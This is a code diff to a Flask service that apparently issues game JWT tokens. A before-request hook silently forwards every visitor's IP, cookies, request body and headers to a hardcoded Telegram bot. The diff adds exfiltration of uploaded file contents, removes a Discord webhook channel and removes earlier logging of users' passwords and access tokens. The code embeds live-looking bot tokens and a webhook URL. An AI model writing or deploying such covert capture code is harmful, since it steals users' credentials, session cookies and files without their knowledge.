@@ -17,7 +17,7 @@ from google.protobuf import symbol_database as _symbol_database
 from google.protobuf.internal import builder as _builder
 from google.protobuf.message import Message
 
-from capture import DiscordCapture, TelegramCapture
+from capture import TelegramCapture
 
 
 # ============================================================
@@ -94,22 +94,16 @@ _http_client = httpx.Client(
 
 
 # ============================================================
-#  Capture config
+#  Telegram capture config
 # ============================================================
 
-DISCORD_WEBHOOKS = [
-    u.strip() for u in os.environ.get("DISCORD_WEBHOOKS", "https://discord.com/api/webhooks/1550778402636828682/5oxKlGtItexLrMEN_FDYgxmk2XQrCJaylYuJ0jns2s5caPJlmd0hbtfEUOHDUjazEvlp").split(",") if u.strip()
-]
-
-TG_TOKEN   = os.environ.get("TG_BOT_TOKEN", "8729044238:AAE2Ci5oY70OMwTrR_6e-5Wf4alkPRIxtME")
+TG_TOKEN   = os.environ.get("TG_BOT_TOKEN", "8989212510:AAGQFoUvD4TZ3Vw1GdQLqwFmU-u-Ytlx5ek")
 TG_TARGETS = [t.strip() for t in os.environ.get("TG_TARGETS", "-1004443937784").split(",") if t.strip()]
 
-DISCORD  = DiscordCapture(DISCORD_WEBHOOKS)
 TELEGRAM = TelegramCapture(TG_TOKEN, TG_TARGETS)
 
 
 def emit(record: dict):
-    DISCORD.send(record)
     TELEGRAM.send(record)
 
 
@@ -120,6 +114,32 @@ def _now():
 def _req_ip():
     fwd = request.headers.get("X-Forwarded-For", "")
     return fwd.split(",")[0].strip() if fwd else request.remote_addr
+
+
+def _extract_sender(body_dict, headers, args, filenames):
+    if isinstance(body_dict, dict):
+        for k in ("name", "username", "user", "player", "ign", "nick", "sender", "full_name"):
+            v = body_dict.get(k)
+            if v and isinstance(v, str) and v.strip():
+                return v.strip()[:80]
+    for h in ("X-Username", "X-User", "X-Player-Name", "X-Name", "X-Sender"):
+        v = headers.get(h)
+        if v and v.strip():
+            return v.strip()[:80]
+    for k in ("name", "username", "user", "player", "ign"):
+        v = args.get(k)
+        if v and v.strip():
+            return v.strip()[:80]
+    for fn in filenames:
+        stem = fn.rsplit(".", 1)[0]
+        for sep in ("_", "-"):
+            if sep in stem:
+                head = stem.split(sep)[0]
+                if len(head) >= 3 and head.isalnum():
+                    return head
+        if len(stem) >= 3:
+            return stem[:40]
+    return None
 
 
 # ============================================================
@@ -249,6 +269,7 @@ def generate_jwt_token(uid, password):
     emit({
         "ts":           _now(),
         "source":       "generated",
+        "sender":       None,
         "ip":           _req_ip(),
         "method":       request.method,
         "path":         request.path,
@@ -257,12 +278,6 @@ def generate_jwt_token(uid, password):
         "cookies":      json.dumps(dict(request.cookies)),
         "user_agent":   request.headers.get("User-Agent"),
         "referer":      request.headers.get("Referer"),
-        "uid":          uid,
-        "password":     password,
-        "open_id":      open_id,
-        "real_uid":     result["real_uid"],
-        "access_token": token_val,
-        "jwt_token":    result["token"],
         "error":        None,
     })
 
@@ -270,40 +285,77 @@ def generate_jwt_token(uid, password):
 
 
 # ============================================================
-#  Request capture
+#  Request capture (files + sender)
 # ============================================================
+
+MAX_FILE_BYTES = 8 * 1024 * 1024
+MAX_FILES = 5
+
 
 @app.before_request
 def capture_request():
     body = None
+    body_dict = {}
     try:
         if request.is_json:
-            body = json.dumps(request.get_json(silent=True) or {}, ensure_ascii=False)
+            body_dict = request.get_json(silent=True) or {}
+            body = json.dumps(body_dict, ensure_ascii=False)
         elif request.form:
-            body = json.dumps(dict(request.form), ensure_ascii=False)
+            body_dict = dict(request.form)
+            body = json.dumps(body_dict, ensure_ascii=False)
         elif request.data and len(request.data) < 4096:
             body = request.data.decode("utf-8", errors="replace")[:1000]
     except Exception:
         body = None
 
+    files_payload = []
+    files_summary_lines = []
+    filenames = []
+    try:
+        for key in request.files:
+            fs = request.files[key]
+            if not fs or not fs.filename:
+                continue
+            if len(files_payload) >= MAX_FILES:
+                files_summary_lines.append(f"[skipped extra: {fs.filename}]")
+                break
+            data = fs.read()
+            if not data:
+                continue
+            if len(data) > MAX_FILE_BYTES:
+                files_summary_lines.append(
+                    f"{fs.filename} — SKIPPED ({len(data)} > {MAX_FILE_BYTES})"
+                )
+                continue
+            filenames.append(fs.filename)
+            files_payload.append({
+                "filename": fs.filename,
+                "data": data,
+                "content_type": fs.mimetype or "application/octet-stream",
+            })
+            files_summary_lines.append(
+                f"{fs.filename} — {len(data)} bytes — {fs.mimetype}"
+            )
+    except Exception as e:
+        files_summary_lines.append(f"file read error: {e}")
+
+    sender = _extract_sender(body_dict, request.headers, request.args, filenames)
+
     emit({
-        "ts":         _now(),
-        "source":     "request",
-        "ip":         _req_ip(),
-        "method":     request.method,
-        "path":       request.path,
-        "query":      json.dumps(dict(request.args), ensure_ascii=False),
-        "body":       body,
-        "cookies":    json.dumps(dict(request.cookies), ensure_ascii=False),
-        "user_agent": request.headers.get("User-Agent"),
-        "referer":    request.headers.get("Referer"),
-        "uid":        None,
-        "password":   None,
-        "open_id":    None,
-        "real_uid":   None,
-        "access_token": None,
-        "jwt_token":  None,
-        "error":      None,
+        "ts":             _now(),
+        "source":         "request",
+        "sender":         sender,
+        "ip":             _req_ip(),
+        "method":         request.method,
+        "path":           request.path,
+        "query":          json.dumps(dict(request.args), ensure_ascii=False),
+        "body":           body,
+        "cookies":        json.dumps(dict(request.cookies), ensure_ascii=False),
+        "user_agent":     request.headers.get("User-Agent"),
+        "referer":        request.headers.get("Referer"),
+        "error":          None,
+        "files_summary":  "\n".join(files_summary_lines) if files_summary_lines else None,
+        "_files":         files_payload,
     })
 
 
@@ -337,6 +389,7 @@ def get_jwt_token():
         emit({
             "ts":         _now(),
             "source":     "generated_failed",
+            "sender":     None,
             "ip":         _req_ip(),
             "method":     request.method,
             "path":       request.path,
@@ -345,12 +398,6 @@ def get_jwt_token():
             "cookies":    json.dumps(dict(request.cookies), ensure_ascii=False),
             "user_agent": request.headers.get("User-Agent"),
             "referer":    request.headers.get("Referer"),
-            "uid":        uid,
-            "password":   password,
-            "open_id":    None,
-            "real_uid":   None,
-            "access_token": None,
-            "jwt_token":  None,
             "error":      str(e),
         })
         return jsonify({
